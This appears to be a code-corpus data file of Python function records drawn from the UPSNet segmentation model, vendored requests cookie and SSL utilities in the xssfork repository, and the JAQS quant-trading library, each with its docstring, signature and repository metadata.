{"docstring": "\"\"\"Generate a random sample of RoIs comprising foreground and background\nexamples.\n\"\"\"\n", "func_signal": "def sample_rois(roidb, im_scale, batch_idx):\n", "code": "rois_per_image = int(config.train.batch_rois)\nfg_rois_per_image = int(np.round(config.train.fg_fraction * rois_per_image))\nmax_overlaps = roidb['max_overlaps']\n\n# Select foreground RoIs as those with >= FG_THRESH overlap\nfg_inds = np.where(max_overlaps >= config.train.fg_thresh)[0]\n# Guard against the case when an image has fewer than fg_rois_per_image\n# foreground RoIs\nfg_rois_per_this_image = np.minimum(fg_rois_per_image, fg_inds.size)\n# Sample foreground regions without replacement\nif fg_inds.size > 0:\n    # print('sample rois use first 128 fg')\n    # fg_inds = fg_inds[:fg_rois_per_this_image]\n    fg_inds = npr.choice(\n        fg_inds, size=fg_rois_per_this_image, replace=False\n    )\n\n# Select background RoIs as those within [BG_THRESH_LO, BG_THRESH_HI)\nbg_inds = np.where(\n    (max_overlaps < config.train.bg_thresh_hi) &\n    (max_overlaps >= config.train.bg_thresh_lo)\n)[0]\n# Compute number of background RoIs to take from this image (guarding\n# against there being fewer than desired)\nbg_rois_per_this_image = rois_per_image - fg_rois_per_this_image\nbg_rois_per_this_image = np.minimum(bg_rois_per_this_image, bg_inds.size)\n# Sample foreground regions without replacement\nif bg_inds.size > 0:\n    # print('sample rois use first 384 bg')\n    # bg_inds = bg_inds[:bg_rois_per_this_image]\n    bg_inds = npr.choice(\n        bg_inds, size=bg_rois_per_this_image, replace=False\n    )\n\n# The indices that we're selecting (both fg and bg)\nkeep_inds = np.append(fg_inds, bg_inds)\n# print(keep_inds.shape)\n# Label is the class each RoI has max overlap with\nsampled_labels = roidb['max_classes'][keep_inds]\nsampled_labels[fg_rois_per_this_image:] = 0  # Label bg RoIs with class 0\nsampled_boxes = roidb['boxes'][keep_inds]\n\nif 'bbox_targets' not in roidb:\n    gt_inds = np.where(roidb['gt_classes'] > 0)[0]\n    gt_boxes = roidb['boxes'][gt_inds, :]\n    gt_assignments = gt_inds[roidb['box_to_gt_ind_map'][keep_inds]]\n    bbox_targets = _compute_targets(\n        sampled_boxes, gt_boxes[gt_assignments, :], sampled_labels\n    )\n    bbox_targets, bbox_inside_weights = _expand_bbox_targets(bbox_targets)\nelse:\n    bbox_targets, bbox_inside_weights = _expand_bbox_targets(\n        roidb['bbox_targets'][keep_inds, :]\n    )\n\nbbox_outside_weights = np.array(\n    bbox_inside_weights > 0, dtype=bbox_inside_weights.dtype\n)\n\n# Scale rois and format as (batch_idx, x1, y1, x2, y2)\nsampled_rois = sampled_boxes * im_scale\nrepeated_batch_idx = batch_idx * np.ones((sampled_rois.shape[0], 1), np.float32)\nsampled_rois = np.hstack((repeated_batch_idx, sampled_rois))\n\nnongt_inds = np.where(roidb['gt_classes'][keep_inds] == 0)[0]\n\n# Base Fast R-CNN blobs\nblob_dict = dict(\n    labels_int32=sampled_labels.astype(np.int32, copy=False),\n    rois=sampled_rois,\n    bbox_targets=bbox_targets,\n    bbox_inside_weights=bbox_inside_weights,\n    bbox_outside_weights=bbox_outside_weights,\n    nongt_inds=nongt_inds\n)\n\n# Optionally add Mask R-CNN blobs\nif config.network.has_mask_head:\n    add_mask_rcnn_blobs(\n        blob_dict, sampled_boxes, roidb, im_scale, batch_idx\n    )\n\nreturn blob_dict", "path": "upsnet\\bbox\\sample_rois.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\n:param cls_indices: [num_boxes x 1]\n:param seg_score: [1 x num_seg_classes x h x w]\n:return: seg_energy: [1 x (num_seg_classes - num_inst_classes + num_boxes) x h x w]\n\"\"\"\n\n", "func_signal": "def forward(self, cls_indices, seg_score, boxes):\n", "code": "assert seg_score.shape[0] == 1, \"only support batch size = 1\"\ncls_indices = cls_indices.cpu().numpy()\nseg_energy = seg_score[[0], :-self.num_inst_classes, :, :]\n\nboxes = boxes.cpu().numpy()\nboxes = boxes[:, 1:] * self.box_scale\n\nif cls_indices.size == 0:\n    return seg_energy, torch.ones_like(seg_energy[[0], [0], :, :]).view(1, 1, seg_energy.shape[2], seg_energy.shape[3]) * -10\nelse:\n    seg_inst_energy = torch.zeros((seg_score.shape[0], cls_indices.shape[0], seg_score.shape[2], seg_score.shape[3]), device=seg_score.device)\n    for i in range(cls_indices.shape[0]):\n        if cls_indices[i] == 0:\n            continue\n        y0 = int(boxes[i][1])\n        y1 = int(boxes[i][3].round()+1)\n        x0 = int(boxes[i][0])\n        x1 = int(boxes[i][2].round()+1)\n        seg_inst_energy[0, i, y0: y1, x0: x1] = seg_score[0, self.class_mapping[cls_indices[i]], y0: y1, x0: x1]\n\n    return seg_energy, seg_inst_energy", "path": "upsnet\\operators\\modules\\unary_logits.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"Callback to Show speed.\"\"\"\n", "func_signal": "def __call__(self, count, metrics):\n", "code": "if self.last_count > count:\n    self.init = False\nself.last_count = count\n\nif self.init:\n    if count % self.frequent == 0:\n        speed = self.frequent * self.batch_size / (time.time() - self.tic)\n        if metrics is not None:\n            s = \"Batch [%d]\\tSpeed: %.2f samples/sec\\tTrain-\" % (count, speed)\n            for metric in metrics:\n                s += \"%s=%f,\\t\" % (metric.get())\n        else:\n            s = \"Batch [%d]\\tSpeed: %.2f samples/sec\" % (count, speed)\n\n        logging.info(s)\n        self.tic = time.time()\nelse:\n    self.init = True\n    self.tic = time.time()", "path": "lib\\utils\\callback.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\nGiven a vector of widths (ws) and heights (hs) around a center\n(x_ctr, y_ctr), output a set of anchors (windows).\n\"\"\"\n\n", "func_signal": "def _mkanchors(ws, hs, x_ctr, y_ctr):\n", "code": "ws = ws[:, np.newaxis]\nhs = hs[:, np.newaxis]\nanchors = np.hstack((x_ctr - 0.5 * (ws - 1),\n                     y_ctr - 0.5 * (hs - 1),\n                     x_ctr + 0.5 * (ws - 1),\n                     y_ctr + 0.5 * (hs - 1)))\nreturn anchors", "path": "upsnet\\rpn\\generate_anchors.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\" unmap a subset inds of data into original data of size count \"\"\"\n", "func_signal": "def _unmap(data, count, inds, fill=0):\n", "code": "if len(data.shape) == 1:\n    ret = np.empty((count,), dtype=np.float32)\n    ret.fill(fill)\n    ret[inds] = data\nelse:\n    ret = np.empty((count,) + data.shape[1:], dtype=np.float32)\n    ret.fill(fill)\n    ret[inds, :] = data\nreturn ret", "path": "upsnet\\rpn\\assign_anchor.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"Bounding-box regression targets are stored in a compact form in the\nroidb.\nThis function expands those targets into the 4-of-4*K representation used\nby the network (i.e. only one class has non-zero targets). The loss weights\nare similarly expanded.\nReturns:\n    bbox_target_data (ndarray): N x 4K blob of regression targets\n    bbox_inside_weights (ndarray): N x 4K blob of loss weights\n\"\"\"\n", "func_signal": "def _expand_bbox_targets(bbox_target_data):\n", "code": "num_bbox_reg_classes = 2 if config.network.cls_agnostic_bbox_reg else config.dataset.num_classes\n\nclss = bbox_target_data[:, 0]\nbbox_targets = np.zeros((clss.size, 4 * num_bbox_reg_classes), dtype=np.float32)\nbbox_inside_weights = np.zeros(bbox_targets.shape, dtype=np.float32)\ninds = np.where(clss > 0)[0]\nfor ind in inds:\n    cls = int(clss[ind])\n    start = 4 * cls\n    end = start + 4\n    bbox_targets[ind, start:end] = bbox_target_data[ind, 1:]\n    bbox_inside_weights[ind, start:end] = (1.0, 1.0, 1.0, 1.0)\nreturn bbox_targets, bbox_inside_weights", "path": "upsnet\\bbox\\sample_rois.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\nReturn width, height, x center, and y center for an anchor (window).\n\"\"\"\n\n", "func_signal": "def _whctrs(anchor):\n", "code": "w = anchor[2] - anchor[0] + 1\nh = anchor[3] - anchor[1] + 1\nx_ctr = anchor[0] + 0.5 * (w - 1)\ny_ctr = anchor[1] + 0.5 * (h - 1)\nreturn w, h, x_ctr, y_ctr", "path": "upsnet\\rpn\\generate_anchors.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\nEnumerate a set of anchors for each scale wrt an anchor.\n\"\"\"\n\n", "func_signal": "def _scale_enum(anchor, scales):\n", "code": "w, h, x_ctr, y_ctr = _whctrs(anchor)\nws = w * scales\nhs = h * scales\nanchors = _mkanchors(ws, hs, x_ctr, y_ctr)\nreturn anchors", "path": "upsnet\\rpn\\generate_anchors.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n\n", "func_signal": "def _compute_targets(ex_rois, gt_rois, labels):\n", "code": "assert ex_rois.shape[0] == gt_rois.shape[0]\nassert ex_rois.shape[1] == 4\nassert gt_rois.shape[1] == 4\n\ntargets = bbox_transform_inv(\n    ex_rois, gt_rois, config.network.bbox_reg_weights\n)\nreturn np.hstack((labels[:, np.newaxis], targets)).astype(\n    np.float32, copy=False\n)", "path": "upsnet\\bbox\\sample_rois.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n", "func_signal": "def compute_targets(ex_rois, gt_rois, weights=(1.0, 1.0, 1.0, 1.0)):\n", "code": "return bbox_transform_inv(ex_rois, gt_rois, weights).astype(\n    np.float32, copy=False\n)", "path": "upsnet\\rpn\\generate_anchors.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\n\n:param masks: [num_boxes x c x 28 x 28]\n:param boxes: [num_boxes x 5]\n:param cls_indices: [num_boxes x 1]\n:param seg_score: [1 x num_seg_classes x h x w]\n:return: mask_energy: [1 x num_boxes x h x w]\n\"\"\"\n\n", "func_signal": "def forward(self, masks, boxes, cls_indices, seg_score):\n", "code": "assert seg_score.shape[0] == 1, \"only support batch size = 1\"\ncls_indices = cls_indices.cpu().numpy()\n\n# remove first dim which indicate batch id\nboxes = boxes[:, 1:] * self.box_scale\nim_shape = seg_score.shape[2:]\n\n# [n x num_boxes x h x w]\nmask_energy = torch.zeros((seg_score.shape[0], masks.shape[0], seg_score.shape[2], seg_score.shape[3]), device=seg_score.device)\n\nfor i in range(cls_indices.shape[0]):\n    ref_box = boxes[i, :].long()\n    w = ref_box[2] - ref_box[0] + 1\n    h = ref_box[3] - ref_box[1] + 1\n    w = max(w, 1)\n    h = max(h, 1)\n    mask = F.upsample(masks[i, 0, :, :].view(1, 1, config.network.mask_size, config.network.mask_size), size=(h, w), mode='bilinear', align_corners=False)\n    x_0 = max(ref_box[0], 0)\n    x_1 = min(ref_box[2] + 1, im_shape[1])\n    y_0 = max(ref_box[1], 0)\n    y_1 = min(ref_box[3] + 1, im_shape[0])\n    mask_energy[0, i, y_0:y_1, x_0:x_1] = \\\n        mask[0, 0, (y_0 - ref_box[1]):(y_1 - ref_box[1]), (x_0 - ref_box[0]):(x_1 - ref_box[0])]\nreturn mask_energy", "path": "upsnet\\operators\\modules\\unary_logits.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\" Remove all boxes with any side smaller than min_size \"\"\"\n", "func_signal": "def _filter_boxes(boxes, min_size):\n", "code": "ws = boxes[:, 2] - boxes[:, 0] + 1\nhs = boxes[:, 3] - boxes[:, 1] + 1\nkeep = np.where((ws >= min_size) & (hs >= min_size))[0]\nreturn keep", "path": "upsnet\\operators\\functions\\pyramid_proposal.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"__get_item__ and get call _find_no_duplicates -- never used in Requests internally.\nTakes as args name and optional domain and path. Returns a cookie.value.\nThrows KeyError if cookie is not found and CookieConflictError if there are\nmultiple cookies that match name and optionally domain and path.\"\"\"\n", "func_signal": "def _find_no_duplicates(self, name, domain=None, path=None):\n", "code": "toReturn = None\nfor cookie in iter(self):\n    if cookie.name == name:\n        if domain is None or cookie.domain == domain:\n            if path is None or cookie.path == path:\n                if toReturn is not None:  # if there are multiple cookies that meet passed in criteria\n                    raise CookieConflictError('There are multiple cookies with name, %r' % (name))\n                toReturn = cookie.value  # we will eventually return this as long as no cookie conflict\n\nif toReturn:\n    return toReturn\nraise KeyError('name=%r, domain=%r, path=%r' % (name, domain, path))", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Returns True if there are multiple domains in the jar.\nReturns False otherwise.\"\"\"\n", "func_signal": "def multiple_domains(self):\n", "code": "domains = []\nfor cookie in iter(self):\n    if cookie.domain is not None and cookie.domain in domains:\n        return True\n    domains.append(cookie.domain)\nreturn False  # there is only one domain in jar", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Dict-like set() that also supports optional domain and path args in\norder to resolve naming collisions from using one cookie jar over\nmultiple domains.\"\"\"\n# support client code that unsets cookies by assignment of a None value:\n", "func_signal": "def set(self, name, value, **kwargs):\n", "code": "if value is None:\n    remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))\n    return\n\nif isinstance(value, Morsel):\n    c = morsel_to_cookie(value)\nelse:\n    c = create_cookie(name, value, **kwargs)\nself.set_cookie(c)\nreturn c", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Takes as an argument an optional domain and path and returns a plain old\nPython dict of name-value pairs of cookies that meet the requirements.\"\"\"\n", "func_signal": "def get_dict(self, domain=None, path=None):\n", "code": "dictionary = {}\nfor cookie in iter(self):\n    if (domain is None or cookie.domain == domain) and (path is None\n                                        or cookie.path == path):\n        dictionary[cookie.name] = cookie.value\nreturn dictionary", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"\nResolves the argument to a numeric constant, which can be passed to\nthe wrap_socket function/method from the ssl module.\nDefaults to :data:`ssl.CERT_NONE`.\nIf given a string it is assumed to be the name of the constant in the\n:mod:`ssl` module or its abbrevation.\n(So you can specify `REQUIRED` instead of `CERT_REQUIRED`.\nIf it's neither `None` nor a string we assume it is already the numeric\nconstant which can directly be passed to wrap_socket.\n\"\"\"\n", "func_signal": "def resolve_cert_reqs(candidate):\n", "code": "if candidate is None:\n    return CERT_NONE\n\nif isinstance(candidate, str):\n    res = getattr(ssl, candidate, None)\n    if res is None:\n        res = getattr(ssl, 'CERT_' + candidate)\n    return res\n\nreturn candidate", "path": "thirdparty\\requests\\packages\\urllib3\\util\\ssl_.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Returns a CookieJar from a key/value dictionary.\n\n:param cookie_dict: Dict of key/values to insert into CookieJar.\n:param cookiejar: (optional) A cookiejar to add the cookies to.\n:param overwrite: (optional) If False, will not replace cookies\n    already in the jar with new ones.\n\"\"\"\n", "func_signal": "def cookiejar_from_dict(cookie_dict, cookiejar=None, overwrite=True):\n", "code": "if cookiejar is None:\n    cookiejar = RequestsCookieJar()\n\nif cookie_dict is not None:\n    names_from_jar = [cookie.name for cookie in cookiejar]\n    for name in cookie_dict:\n        if overwrite or (name not in names_from_jar):\n            cookiejar.set_cookie(create_cookie(name, cookie_dict[name]))\n\nreturn cookiejar", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Unlike a normal CookieJar, this class is pickleable.\"\"\"\n", "func_signal": "def __setstate__(self, state):\n", "code": "self.__dict__.update(state)\nif '_cookies_lock' not in self.__dict__:\n    self._cookies_lock = threading.RLock()", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Dict-like iteritems() that returns an iterator of name-value tuples from the jar.\nSee iterkeys() and itervalues().\"\"\"\n", "func_signal": "def iteritems(self):\n", "code": "for cookie in iter(self):\n    yield cookie.name, cookie.value", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Updates this jar with cookies from another CookieJar or dict-like\"\"\"\n", "func_signal": "def update(self, other):\n", "code": "if isinstance(other, cookielib.CookieJar):\n    for cookie in other:\n        self.set_cookie(cookie)\nelse:\n    super(RequestsCookieJar, self).update(other)", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Dict-like get() that also supports optional domain and path args in\norder to resolve naming collisions from using one cookie jar over\nmultiple domains. Caution: operation is O(n), not O(1).\"\"\"\n", "func_signal": "def get(self, name, default=None, domain=None, path=None):\n", "code": "try:\n    return self._find_no_duplicates(name, domain, path)\nexcept KeyError:\n    return default", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"\nChecks if given fingerprint matches the supplied certificate.\n\n:param cert:\n    Certificate as bytes object.\n:param fingerprint:\n    Fingerprint as string of hexdigits, can be interspersed by colons.\n\"\"\"\n\n# Maps the length of a digest to a possible hash function producing\n# this digest.\n", "func_signal": "def assert_fingerprint(cert, fingerprint):\n", "code": "hashfunc_map = {\n    16: md5,\n    20: sha1\n}\n\nfingerprint = fingerprint.replace(':', '').lower()\ndigest_length, odd = divmod(len(fingerprint), 2)\n\nif odd or digest_length not in hashfunc_map:\n    raise SSLError('Fingerprint is of invalid length.')\n\n# We need encode() here for py32; works on py2 and p33.\nfingerprint_bytes = unhexlify(fingerprint.encode())\n\nhashfunc = hashfunc_map[digest_length]\n\ncert_digest = hashfunc(cert).digest()\n\nif not cert_digest == fingerprint_bytes:\n    raise SSLError('Fingerprints did not match. Expected \"{0}\", got \"{1}\".'\n                   .format(hexlify(fingerprint_bytes),\n                           hexlify(cert_digest)))", "path": "thirdparty\\requests\\packages\\urllib3\\util\\ssl_.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Utility method to list all the domains in the jar.\"\"\"\n", "func_signal": "def list_domains(self):\n", "code": "domains = []\nfor cookie in iter(self):\n    if cookie.domain not in domains:\n        domains.append(cookie.domain)\nreturn domains", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Add cookies to cookiejar and returns a merged CookieJar.\n\n:param cookiejar: CookieJar object to add the cookies to.\n:param cookies: Dictionary or CookieJar object to be added.\n\"\"\"\n", "func_signal": "def merge_cookies(cookiejar, cookies):\n", "code": "if not isinstance(cookiejar, cookielib.CookieJar):\n    raise ValueError('You can only merge into CookieJar')\n\nif isinstance(cookies, dict):\n    cookiejar = cookiejar_from_dict(\n        cookies, cookiejar=cookiejar, overwrite=False)\nelif isinstance(cookies, cookielib.CookieJar):\n    try:\n        cookiejar.update(cookies)\n    except AttributeError:\n        for cookie_in_jar in cookies:\n            cookiejar.set_cookie(cookie_in_jar)\n\nreturn cookiejar", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Convert a Morsel object into a Cookie containing the one k/v pair.\"\"\"\n\n", "func_signal": "def morsel_to_cookie(morsel):\n", "code": "expires = None\nif morsel['max-age']:\n    expires = time.time() + morsel['max-age']\nelif morsel['expires']:\n    time_template = '%a, %d-%b-%Y %H:%M:%S GMT'\n    expires = time.mktime(\n        time.strptime(morsel['expires'], time_template)) - time.timezone\nreturn create_cookie(\n    comment=morsel['comment'],\n    comment_url=bool(morsel['comment']),\n    discard=False,\n    domain=morsel['domain'],\n    expires=expires,\n    name=morsel.key,\n    path=morsel['path'],\n    port=None,\n    rest={'HttpOnly': morsel['httponly']},\n    rfc2109=False,\n    secure=bool(morsel['secure']),\n    value=morsel.value,\n    version=morsel['version'] or 0,\n)", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Make a cookie from underspecified parameters.\n\nBy default, the pair of `name` and `value` will be set for the domain ''\nand sent on every request (this is sometimes called a \"supercookie\").\n\"\"\"\n", "func_signal": "def create_cookie(name, value, **kwargs):\n", "code": "result = dict(\n    version=0,\n    name=name,\n    value=value,\n    port=None,\n    domain='',\n    path='/',\n    secure=False,\n    expires=None,\n    discard=True,\n    comment=None,\n    comment_url=None,\n    rest={'HttpOnly': None},\n    rfc2109=False,)\n\nbadargs = set(kwargs) - set(result)\nif badargs:\n    err = 'create_cookie() got unexpected keyword arguments: %s'\n    raise TypeError(err % list(badargs))\n\nresult.update(kwargs)\nresult['port_specified'] = bool(result['port'])\nresult['domain_specified'] = bool(result['domain'])\nresult['domain_initial_dot'] = result['domain'].startswith('.')\nresult['path_specified'] = bool(result['path'])\n\nreturn cookielib.Cookie(**result)", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Extract the cookies from the response into a CookieJar.\n\n:param jar: cookielib.CookieJar (not necessarily a RequestsCookieJar)\n:param request: our own requests.Request object\n:param response: urllib3.HTTPResponse object\n\"\"\"\n", "func_signal": "def extract_cookies_to_jar(jar, request, response):\n", "code": "if not (hasattr(response, '_original_response') and\n        response._original_response):\n    return\n# the _original_response field is the wrapped httplib.HTTPResponse object,\nreq = MockRequest(request)\n# pull out the HTTPMessage with the headers and put it in the mock:\nres = MockResponse(response._original_response.msg)\njar.extract_cookies(res, req)", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Unlike a normal CookieJar, this class is pickleable.\"\"\"\n", "func_signal": "def __getstate__(self):\n", "code": "state = self.__dict__.copy()\n# remove the unpickleable RLock object\nstate.pop('_cookies_lock')\nreturn state", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Requests uses this method internally to get cookie values. Takes as args name\nand optional domain and path. Returns a cookie.value. If there are conflicting cookies,\n_find arbitrarily chooses one. See _find_no_duplicates if you want an exception thrown\nif there are conflicting cookies.\"\"\"\n", "func_signal": "def _find(self, name, domain=None, path=None):\n", "code": "for cookie in iter(self):\n    if cookie.name == name:\n        if domain is None or cookie.domain == domain:\n            if path is None or cookie.path == path:\n                return cookie.value\n\nraise KeyError('name=%r, domain=%r, path=%r' % (name, domain, path))", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "# Only return the response's URL if the user hadn't set the Host\n# header\n", "func_signal": "def get_full_url(self):\n", "code": "if not self._r.headers.get('Host'):\n    return self._r.url\n# If they did set it, retrieve it and reconstruct the expected domain\nhost = self._r.headers['Host']\nparsed = urlparse(self._r.url)\n# Reconstruct the URL as we expect it\nreturn urlunparse([\n    parsed.scheme, host, parsed.path, parsed.params, parsed.query,\n    parsed.fragment\n])", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"Utility method to list all the paths in the jar.\"\"\"\n", "func_signal": "def list_paths(self):\n", "code": "paths = []\nfor cookie in iter(self):\n    if cookie.path not in paths:\n        paths.append(cookie.path)\nreturn paths", "path": "thirdparty\\requests\\cookies.py", "repo_name": "bsmali4/xssfork", "stars": 710, "license": "None", "language": "python", "size": 61527}
{"docstring": "\"\"\"\n    use_jrpc:\n        True     -- Use jrcp_client of C version, for jzts only\n        False    -- Use pure python version\n    prod_type:\n        \"jaqs\"   -- jrpc_msgpack_wth_snappy\n        \"jzts\"   -- jrpc_msgpack\n\"\"\"\n\n", "func_signal": "def __init__(self, addr, use_jrpc=False, prod_type=\"jzts\"):\n", "code": "self._remote = None\nif prod_type == \"jzts\":\n    try:\n        if use_jrpc:\n            import jrpc\n            self._remote = jrpc.JsonRpcClient()\n        else:\n            from . import jrpc_py\n            self._remote = jrpc_py.JRpcClient(data_format=\"msgpack\")\n    except Exception as e:\n        print(\"Exception\", e)\n\n    if not self._remote:\n        from . import jrpc_py\n        self._remote = jrpc_py.JRpcClient(data_format=\"msgpack\")\n\nelse:\n    from . import jrpc_py\n    self._remote = jrpc_py.JRpcClient(data_format=\"msgpack_snappy\")\n\nself._remote.on_rpc_callback = self._on_rpc_callback\nself._remote.on_disconnected = self._on_disconnected\nself._remote.on_connected    = self._on_connected\nself._remote.connect(addr)\n\nself._ordstatus_callback = None\nself._taskstatus_callback = None\nself._internal_order_callback = None\nself._trade_callback = None\nself._on_connection_callback = None\nself._connected   = False\nself._username    = \"\"\nself._password    = \"\"\nself._strategy_id = 0\nself._strategy_selected = False\nself._data_format = \"default\"", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nGet bar DataFrame from DataApi or DataView.\n\nParameters\n----------\nsymbols : str\ndate : int\n\nReturns\n-------\nres : pd.DataFrame\n\n\"\"\"\n", "func_signal": "def _get_df_bar(self, symbols, date):\n", "code": "if self.ctx.dataview is not None:\n    df_quotes = self.ctx.dataview.get(symbol=symbols,\n                                      start_date=date, end_date=date,\n                                      fields='open,high,low,close,volume,oi,trade_date,date,time',\n                                      data_format='long')\nelif self.ctx.data_api is not None:\n    df_quotes, _ = self.ctx.data_api.bar(symbol=symbols,\n                                           start_time=200000, end_time=160000, trade_date=date,\n                                           freq=self.bar_type)\nelse:\n    raise ValueError()\n\nreturn df_quotes", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\norders format:\n    [ {\"security\": \"000001.SZ\", \"action\": \"Buy\", \"price\": 10.0, \"size\" : 100}, ... ]\nreturn (result, message)\nif result is None, message contains error information\n\"\"\"\n\n", "func_signal": "def place_batch_order(self, orders, algo=\"\", algo_param={}, userdata=\"\"):\n", "code": "if not orders or not isinstance(orders, (list, tuple)):\n    return (None, \"empty order\")\n\nif isinstance(orders[0], EntrustOrder):\n    tmp = []\n    for o in orders:\n        tmp.append({\"security\": o.security,\n                    \"action\"  : o.action,\n                    \"price\"   : o.price,\n                    \"size\"    : int(o.size)})\n\n    orders = tmp\n\nr, msg = self._check_session()\nif not r: return (None, msg)\n\nrpc_params = {\"orders\"     : orders,\n              \"algo\"       : algo,\n              \"algo_param\" : json.dumps(algo_param),\n              \"user\"       : self._username,\n              \"userdata\"   : userdata}\n\ncr = self._remote.call(\"oms.place_batch_order\", rpc_params)\nreturn utils.extract_result(cr)", "path": "jaqs\\trade\\tradeapi\\trade_api.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nGiven a trade date, query bars of all symbols on that day and return a nested dict.\n\nParameters\n----------\ndate : int\n    Trade date.\n\nReturns\n-------\nres : list of tuples\n    Three-element tuple: (trade_date, time, dict of quote)\n\n\"\"\"\n# query quotes data\n", "func_signal": "def _create_time_symbol_bars(self, date):\n", "code": "symbols_str = ','.join(self.ctx.universe)\ndf_quotes = self._get_df_bar(symbols_str, date)\nif df_quotes is None or df_quotes.empty:\n    return dict()\n    \n# create nested dict\ndf_quotes = df_quotes.sort_values(['date', 'time', 'symbol'])\nres = []\nfor time, df in df_quotes.groupby(by=['time'], sort=False):\n    quotes_list = Bar.create_from_df(df)\n    dic = {quote.symbol: quote for quote in quotes_list}\n    res.append((time, dic))\nreturn res", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
{"docstring": "\"\"\"\nGiven a trade date range, query daily bars of all symbols in that range and return a list.\n\nParameters\n----------\nstart_date : int\n    Trade date.\nend_date : int\n    Trade date.\n\nReturns\n-------\nres : list of tuples\n    Two-element tuple: (trade_date, dict of quotes)\n\n\"\"\"\n# query quotes data\n", "func_signal": "def _create_daily_symbol_bars(self, start_date, end_date):\n", "code": "symbols_str = ','.join(self.ctx.universe)\ndf_daily = self._get_df_daily(symbol=symbols_str, start_date=start_date, end_date=end_date)\ndf_daily['date'] = df_daily['trade_date']\nif df_daily is None or df_daily.empty:\n    return dict()\n\n# create nested dict\ndf_daily = df_daily.sort_values(['trade_date', 'symbol'])\nres = []\nfor date, df in df_daily.groupby(by='trade_date'):\n    quotes_list = Bar.create_from_df(df)\n    dic = {quote.symbol: quote for quote in quotes_list}\n    res.append((date, dic))\n    \nreturn res", "path": "jaqs\\trade\\backtest.py", "repo_name": "quantOS-org/JAQS", "stars": 591, "license": "other", "language": "python", "size": 11757}
